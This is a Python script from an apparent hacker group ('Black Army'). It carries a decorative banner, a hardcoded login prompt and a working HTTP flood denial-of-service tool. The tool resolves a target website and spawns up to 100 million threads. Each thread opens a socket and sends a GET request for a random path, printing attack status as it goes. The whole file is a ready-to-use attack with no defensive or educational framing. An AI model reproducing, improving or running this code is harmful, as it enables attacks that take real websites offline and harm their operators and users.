# -*- coding: utf-8 -*-
import os
import random
import socket
import string
import sys
import threading
import time

attemps = 0
os.system("clear")
print("""  
\033[37m
 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ▒▒▒███████╗▒▒██╗▒▒▒▒▒▒████╗▒▒▒▒██████╗▒██╗▒▒▒███╗▒▒██████╗▒▒████╗▒████████╗▒▒▒
 ▒▒▒██╔═══██╗▒██║▒▒▒▒▒██╔═██╚╗▒██╔════╝▒██║▒▒██╔═╝▒██╔════╝▒██╔═██╚╗▒▒██╔══╝▒▒▒
 ▒▒▒██║▒▒▒██║▒██║▒▒▒▒██║▒▒▒██║▒██║▒▒▒▒▒▒██║▒██╔╝▒▒▒██║▒▒▒▒▒██║▒▒▒██║▒▒██║▒▒▒▒▒▒ 
 ▒▒▒██║▒▒▒██║▒██║▒▒▒▒██║▒▒▒██║▒██║▒▒▒▒▒▒██║██╔╝▒▒▒▒██║▒▒▒▒▒██║▒▒▒██║▒▒██║▒▒▒▒▒▒
 ▒▒▒██████═╗╝▒██║▒▒▒▒██║▒▒▒██║▒██║▒▒▒▒▒▒██║▒██╚╗▒▒▒██║▒▒▒▒▒██║▒▒▒██║▒▒██║▒▒▒▒▒▒
 ▒▒▒██╔══██║▒▒██║▒▒▒▒██║█████║▒██║▒▒▒▒▒▒██║▒▒██╚╗▒▒██║▒▒▒▒▒██║█████║▒▒██║▒▒▒▒▒▒
 ▒▒▒██████╔╝▒▒██████╗██╔═══██║▒▒██████╗▒██║▒▒▒██╚╗▒▒██████╗██╔═══██║▒▒██║▒▒▒▒▒▒
 ▒▒▒╚═════╝▒▒▒╚═════╝╚═╝▒▒▒╚═╝▒▒╚═════╝▒╚═╝▒▒▒╚══╝▒▒╚═════╝╚═╝▒▒▒╚═╝▒▒╚═╝▒▒▒▒▒▒
 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[38;5;5m ╔════════════════════════════════════════════════════════════════════════════╗\033[0m
\033[38;5;5m ║\033[48;5;7m \033[30mWarning...!! Script ini diperuntukan buat grup Black Army.          \033[48;5;7m       \033[0m\033[38;5;5m║
\033[38;5;5m ║\033[48;5;7m \033[30mBoleh di gunakan di grup lain tapi tidak diperkenankan utk dishare  \033[48;5;7m       \033[0m\033[38;5;5m║
\033[38;5;5m ╚════════════════════════════════════════════════════════════════════════════╝
""")

while attemps < 100:
    username = input("\033[32m┏> Enter your username:\033[30m")
    password = input("\033[32m┗> Enter your password:\033[30m")

    if username == 'yyy' and password == 'yyy':
        print("\033[48;5;3m•••⟩⟩ Zona attack sikucing hitam...!!\033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
# Parse inputs
host = ""
ip = ""
port = 0
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print (f"\n Usage: {sys.argv[0]} < Hostname > < Port > < Number-of-attacks >")
    sys.exit(1)

# Convert FQDN to IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print (" ERROR\n Make sure you entered a correct website")
    sys.exit(2)

# Create a shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()


# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    #print the output on the sameline
    sys.stdout.write(f"\r\033[48;5;7m\033[38;5;0m{time.ctime().split( )[3]}\033[0m ")
    sys.stdout.flush()
    print (f"\033[92mGet-started Host \033[33m" +str(host)+ " \033[32mIp address \033[92m" +(ip)+ "")
    sys.stdout.write(f"\r••\033[48;5;4m\033[37m[{str(thread_num)}]\033[0m ")
    sys.stdout.flush()
    print (f"\033[33mGet-started Host \033[37m" +str(host)+ " \033[36mIp address \033[35m" +(ip)+ "")
    thread_num_mutex.release()


# Generate URL Path
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Perform the request
def attack():
    print_status()
    url_path = generate_url_path()

    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Open the connection on that raw socket
        dos.connect((ip, port))

        # Send the request according to HTTP spec
        #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
    finally:
        # Close our socket gracefully
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print (f"==⟩⟩ Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")

# Spawn a thread per request
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    # Adjusting this sleep time will affect requests per second
    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads
